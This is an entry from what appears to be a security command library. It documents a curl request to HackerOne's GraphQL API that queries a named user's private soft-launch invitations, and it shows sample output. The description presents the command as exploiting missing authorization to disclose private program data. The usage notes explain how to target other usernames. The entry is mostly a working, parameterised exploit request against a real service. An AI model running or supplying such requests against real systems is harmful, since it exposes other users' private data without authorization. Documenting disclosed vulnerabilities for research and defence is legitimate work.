---
id: cmd-uuid-1
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -d '{"query":"query
  Directory_invitations_page($state_0:[InvitationStateEnum]!,$state_3:[InvitationStateEnum]!,$first_1:Int!,$size_2:ProfilePictureSizes!)
  {\n  user(username:\"jobert\") {\n    id,\n    ...F5\n  }\n}\nfragment F0 on
  User {\n 
  _soft_launch_invitations259p9N:soft_launch_invitations(state:$state_0,first:$first_1)
  {\n    total_count\n  },\n  id\n}\nfragment F1 on InvitationsSoftLaunch {\n 
  id,\n  team {\n    handle,\n    url,\n    name,\n    about,\n   
  bug_count,\n    base_bounty,\n    offers_bounties,\n    currency,\n   
  _profile_picture2rz4nb:profile_picture(size:$size_2),\n    id\n  },\n 
  expires_at,\n  state,\n  token\n}\nfragment F2 on Node {\n  id,\n 
  __typename\n}\nfragment F3 on InvitationInterface {\n  __typename,\n 
  ...F1,\n  ...F2\n}\nfragment F4 on User {\n 
  _soft_launch_invitations1WD3Qk:soft_launch_invitations(state:$state_0,first:$first_1)
  {\n    total_count,\n    edges {\n      node {\n        id,\n       
  ...F3\n      },\n      cursor\n    },\n    pageInfo {\n     
  hasNextPage,\n      hasPreviousPage\n    }\n  },\n 
  _soft_launch_invitations2FRMOR:soft_launch_invitations(state:$state_3,first:$first_1)
  {\n    total_count\n  },\n  id\n}\nfragment F5 on User {\n  id,\n  ...F0,\n 
  ...F4\n}","variables":{"state_0":["pending_terms","open","accepted"],"state_3":["pending_terms","open","accepted","cancelled","rejected"],"first_1":100,"size_2":"large"}}'
tags:
  - graphql
  - api
type: command
output: '{"data":{"user":{"_soft_launch_invitations259p9N":{"total_count":27}}}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.095Z'
verified: false
validated: true
submitted: true
---
# graphql-query-user-invitations

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query":"query Directory_invitations_page($state_0:[InvitationStateEnum]!,$state_3:[InvitationStateEnum]!,$first_1:Int!,$size_2:ProfilePictureSizes!) {\n  user(username:\"jobert\") {\n    id,\n    ...F5\n  }\n}\nfragment F0 on User {\n  _soft_launch_invitations259p9N:soft_launch_invitations(state:$state_0,first:$first_1) {\n    total_count\n  },\n  id\n}\nfragment F1 on InvitationsSoftLaunch {\n  id,\n  team {\n    handle,\n    url,\n    name,\n    about,\n    bug_count,\n    base_bounty,\n    offers_bounties,\n    currency,\n    _profile_picture2rz4nb:profile_picture(size:$size_2),\n    id\n  },\n  expires_at,\n  state,\n  token\n}\nfragment F2 on Node {\n  id,\n  __typename\n}\nfragment F3 on InvitationInterface {\n  __typename,\n  ...F1,\n  ...F2\n}\nfragment F4 on User {\n  _soft_launch_invitations1WD3Qk:soft_launch_invitations(state:$state_0,first:$first_1) {\n    total_count,\n    edges {\n      node {\n        id,\n        ...F3\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  _soft_launch_invitations2FRMOR:soft_launch_invitations(state:$state_3,first:$first_1) {\n    total_count\n  },\n  id\n}\nfragment F5 on User {\n  id,\n  ...F0,\n  ...F4\n}","variables":{"state_0":["pending_terms","open","accepted"],"state_3":["pending_terms","open","accepted","cancelled","rejected"],"first_1":100,"size_2":"large"}}'
```

## Description

This command performs a POST request to HackerOne's GraphQL API to query the total count of soft_launch_invitations for a specified user (e.g., 'jobert') across invitation states, exploiting missing authorization to disclose private program data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{...}'` | JSON payload with query and variables | Yes |
| `username` | Target username in query (e.g., "jobert") | Yes |
| `state_0` | Array of states for first query (e.g., ["pending_terms","open","accepted"]) | Yes |
| `state_3` | Array of all states (e.g., ["pending_terms","open","accepted","cancelled","rejected"]) | Yes |
| `first_1` | Pagination limit (e.g., 100) | Yes |
| `size_2` | Profile picture size (e.g., "large") | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{...}'
```

### Advanced Usage

Modify the username in the query string to target different users, or adjust states for specific filters.

## Expected Output

JSON response with data.user._soft_launch_invitations259p9N.total_count, e.g., {"total_count":27}, revealing the number of private invitations.

## Related

- [[procedures/Query-User-Private-Invitations-via-GraphQL]]
